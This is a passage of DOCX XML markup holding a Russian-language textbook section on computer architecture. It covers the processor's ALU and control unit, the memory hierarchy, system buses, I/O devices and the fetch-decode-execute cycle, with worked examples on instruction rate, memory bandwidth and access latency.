      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Логические операции**: И, ИЛИ, НЕ, XOR (глава 1.6 на связи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Операции сдвига**: сдвиги битов влево/вправо</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Операции сравнения**: больше, меньше, равно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">АЛУ работает с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>регистрами</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сверхбыстрыми ячейками памяти внутри процессора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Устройство управления (УУ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>УУ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (англ. CU — Control Unit) — это дирижёр оркестра. Оно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Извлекает инструкции** из памяти (fetch)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Декодирует** их (decode) — определяет, что нужно делать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Выполняет** (execute) — отдаёт команды АЛУ, памяти, устройствам ввода-вывода</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Управляет** последовательностью операций</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Память (Memory)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оперативная память</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ОЗУ, RAM) — это временное хранилище для данных и программ во время их выполнения. Мы уже обсуждали её организацию в главе 1.2.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Типы памяти по иерархии (от быстрой к медленной):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Регистры** — внутри процессора, доступ за 1 такт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Кэш L1/L2/L3** — буферная память, доступ за 3-30 тактов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ОЗУ (RAM)** — основная память, доступ за 100-300 тактов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ПЗУ (ROM)** — постоянная память (BIOS/UEFI)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Внешняя память** (SSD/HDD) — долговременное хранение, доступ за миллионы тактов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t>: Чем ближе память к процессору, тем она быстрее, но и дороже. Поэтому регистров — десятки байт, кэша — мегабайты, RAM — гигабайты, SSD — терабайты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Системная магистраль (шина)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шина</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bus) — это набор линий связи, по которым передаются данные между компонентами. Шина состоит из трёх частей:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Шина данных (Data Bus)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Передаёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>собственно данные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> между процессором, памятью и устройствами. Разрядность шины данных определяет, сколько бит можно передать за один раз:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>8-разрядная шина: 1 байт за раз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>32-разрядная шина: 4 байта за раз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>64-разрядная шина: 8 байт за раз</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Если процессор 64-разрядный, а шина данных 64-битная, то за один такт можно прочитать/записать 8 байт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Адресная шина (Address Bus)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Передаёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>адреса</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ячеек памяти или устройств. Разрядность адресной шины определяет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>объём адресуемой памяти</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>16-разрядная шина: 2¹⁶ = 64 КБ адресного пространства</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>32-разрядная шина: 2³² = 4 ГБ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>64-разрядная шина: 2⁶⁴ ≈ 16 эксабайт (теоретически)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прим. для умных</w:t>
      </w:r>
      <w:r>
        <w:t>: На практике современные x86-64 процессоры используют не все 64 бита для адресации (обычно 48 или 52), что даёт 256 ТБ или 4 ПБ адресного пространства — более чем достаточно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Шина управления (Control Bus)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Передаёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>управляющие сигналы</w:t>
      </w:r>
      <w:r>
        <w:t>: чтение/запись, готовность, прерывание и т.д. Это как светофоры на дороге: без них все бы врезались друг в друга.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Устройства ввода-вывода (I/O Devices)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Устройства ввода</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: клавиатура, мышь, микрофон, камера, сканер — всё, что позволяет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ввести данные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в компьютер.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Устройства вывода</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: монитор, принтер, динамики — всё, что </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>выводит результат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> работы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Устройства ввода-вывода</w:t>
      </w:r>
      <w:r>
        <w:t>: сетевая карта, жёсткий диск, USB-устройства — могут и принимать, и передавать данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Функциональная схема ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь соберём всё вместе. Вот упрощённая схема взаимодействия компонентов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>┌───────────────────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│                   ПРОЦЕССОР (CPU)                 │</w:t>
        <w:br/>
        <w:t>│  ┌─────────────────┐      ┌───────────────────┐  │</w:t>
        <w:br/>
        <w:t>│  │ Устройство      │      │  АЛУ (арифметико- │  │</w:t>
        <w:br/>
        <w:t>│  │ управления (УУ) │◄────►│  логическое       │  │</w:t>
        <w:br/>
        <w:t>│  │                 │      │  устройство)      │  │</w:t>
        <w:br/>
        <w:t>│  └────────┬────────┘      └─────────┬─────────┘  │</w:t>
        <w:br/>
        <w:t>│           │                         │            │</w:t>
        <w:br/>
        <w:t>│           └─────────┬───────────────┘            │</w:t>
        <w:br/>
        <w:t>│                     │ Регистры                   │</w:t>
        <w:br/>
        <w:t>└─────────────────────┼────────────────────────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">                      │</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ┌─────────────┼─────────────┐</w:t>
        <w:br/>
        <w:t xml:space="preserve">        │   СИСТЕМНАЯ МАГИСТРАЛЬ    │</w:t>
        <w:br/>
        <w:t xml:space="preserve">        │  ┌───────────────────┐    │</w:t>
        <w:br/>
        <w:t xml:space="preserve">        │  │  Шина данных      │    │</w:t>
        <w:br/>
        <w:t xml:space="preserve">        │  ├───────────────────┤    │</w:t>
        <w:br/>
        <w:t xml:space="preserve">        │  │  Адресная шина    │    │</w:t>
        <w:br/>
        <w:t xml:space="preserve">        │  ├───────────────────┤    │</w:t>
        <w:br/>
        <w:t xml:space="preserve">        │  │  Шина управления  │    │</w:t>
        <w:br/>
        <w:t xml:space="preserve">        │  └───────────────────┘    │</w:t>
        <w:br/>
        <w:t xml:space="preserve">        └─────────┬─────────────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">                  │</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ┌─────────────┼─────────────────────────┐</w:t>
        <w:br/>
        <w:t xml:space="preserve">    │             │                         │</w:t>
        <w:br/>
        <w:t>┌───▼────┐   ┌───▼───┐   ┌─────────────────▼──┐</w:t>
        <w:br/>
        <w:t>│ Память │   │  ПЗУ  │   │ Устройства         │</w:t>
        <w:br/>
        <w:t>│  (ОЗУ) │   │ (ROM) │   │ ввода-вывода       │</w:t>
        <w:br/>
        <w:t>│  (RAM) │   │       │   │ (I/O)              │</w:t>
        <w:br/>
        <w:t>└────────┘   └───────┘   └────────────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как это работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**УУ** извлекает инструкцию из **памяти** через **адресную шину**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**УУ** декодирует инструкцию и определяет, что делать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если нужны данные — **УУ** читает их из **памяти** через **шину данных**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**АЛУ** выполняет операцию над данными</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Результат записывается обратно в **память** или **регистр**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**УУ** переходит к следующей инструкции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Этот цикл называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>цикл выборки-выполнения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (fetch-decode-execute cycle) и повторяется миллиарды раз в секунду.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Характеристики производительности ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Теперь поговорим о том, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как оценить, насколько быстр компьютер</w:t>
      </w:r>
      <w:r>
        <w:t>. Спойлер: просто посмотреть на частоту процессора — это как оценивать машину только по объёму двигателя. Важно, но не достаточно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Разрядность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разрядность процессора</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это количество бит, обрабатываемых за одну операцию. Она определяется разрядностью:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Регистров** (сколько бит помещается в регистр)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**АЛУ** (сколько бит АЛУ обрабатывает за раз)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шины данных** (сколько бит передаётся за такт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Исторически процессоры эволюционировали: 4-бит → 8-бит → 16-бит → 32-бит → 64-бит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практическое значение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**8-битный процессор**: может сложить числа 0-255 за одну операцию (или -128 до +127 со знаком)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**32-битный**: работает с числами до 4 млрд, адресует до 4 ГБ памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**64-битный**: работает с огромными числами, адресует эксабайты памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Тактовая частота</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Тактовая частота</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (clock frequency) — это количество тактов процессора в секунду, измеряется в герцах (Гц).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 Гц</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = 1 такт в секунду  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 МГц</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = 1 миллион тактов в секунду  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 ГГц</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = 1 миллиард тактов в секунду</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Процессор с частотой 3 ГГц выполняет 3 миллиарда тактов в секунду.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Частота ≠ производительность! Разные процессоры выполняют разное количество инструкций за такт. Современные процессоры используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>конвейеризацию</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>суперскалярность</w:t>
      </w:r>
      <w:r>
        <w:t>, выполняя несколько инструкций за такт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Вычисление количества инструкций в секунду</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Процессор работает на частоте 2.5 ГГц и выполняет в среднем 2 инструкции за такт (IPC = instructions per cycle). Сколько инструкций в секунду он выполняет?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Количество инструкций = Частота × IPC</w:t>
        <w:br/>
        <w:t>Количество инструкций = 2.5 ГГц × 2 = 5 млрд инструкций/сек = 5 GIPS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t>: 5 миллиардов инструкций в секунду (5 GIPS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пропускная способность шины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пропускная способность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bandwidth) — это объём данных, передаваемых за единицу времени. Для шины данных:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пропускная способность = (Разрядность шины / 8) × Частота шины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Разрядность делим на 8, чтобы перевести биты в байты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Расчёт пропускной способности памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Оперативная память DDR4-3200 имеет 64-битную шину данных и работает на эффективной частоте 3200 МГц. Какова её пропускная способность?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пропускная способность = (64 бита / 8) × 3200 МГц</w:t>
        <w:br/>
        <w:t xml:space="preserve">                       = 8 байт × 3200 МГц</w:t>
        <w:br/>
        <w:t xml:space="preserve">                       = 25 600 МБ/с</w:t>
        <w:br/>
        <w:t xml:space="preserve">                       = 25.6 ГБ/с</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t>: 25.6 ГБ/с (гигабайт в секунду).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примечание</w:t>
      </w:r>
      <w:r>
        <w:t>: На практике пропускная способность может быть ниже из-за задержек (латентности) и других факторов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Время доступа к памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время доступа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (access time, latency) — это задержка между запросом данных и их получением. Измеряется в наносекундах (нс) или тактах процессора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Сравнение времени доступа к разным уровням памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Процессор работает на частоте 3 ГГц (период такта = 0.33 нс). Сравним время доступа к разным типам памяти:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регистр: 1 такт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кэш L1: 4 такта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кэш L2: 12 тактов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кэш L3: 40 тактов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ОЗУ (RAM): 200 тактов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SSD: ~100 000 тактов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HDD: ~10 000 000 тактов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (переведём в наносекунды):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Тип памяти | Такты | Время (нс)     | Время (человеческое) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------|-------|----------------|---------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Регистр   | 1     | 0.33 нс        | 1 секунда           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Кэш L1    | 4     | 1.3 нс         | 4 секунды           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Кэш L2    | 12    | 4 нс           | 12 секунд           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Кэш L3    | 40    | 13 нс          | 40 секунд           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| RAM       | 200   | 67 нс          | 3.3 минуты          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| SSD       | 100K  | 33 мкс         | 9.3 часа            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| HDD       | 10M   | 3.3 мс         | 38 дней             |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t>: Если доступ к регистру занимает 1 секунду, то доступ к жёсткому диску — это как ждать больше месяца. Вот почему кэширование так важно!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры архитектур</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Теперь посмотрим на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>реальные архитектуры</w:t>
      </w:r>
      <w:r>
        <w:t>, с которыми ты сталкиваешься каждый день.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>x86 и x86-64 (AMD64, Intel 64)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>x86</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это архитектура, разработанная Intel в 1978 году (процессор 8086). 32-битная версия называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IA-32</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Intel Architecture, 32-bit), 64-битное расширение — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>x86-64</w:t>
      </w:r>
      <w:r>
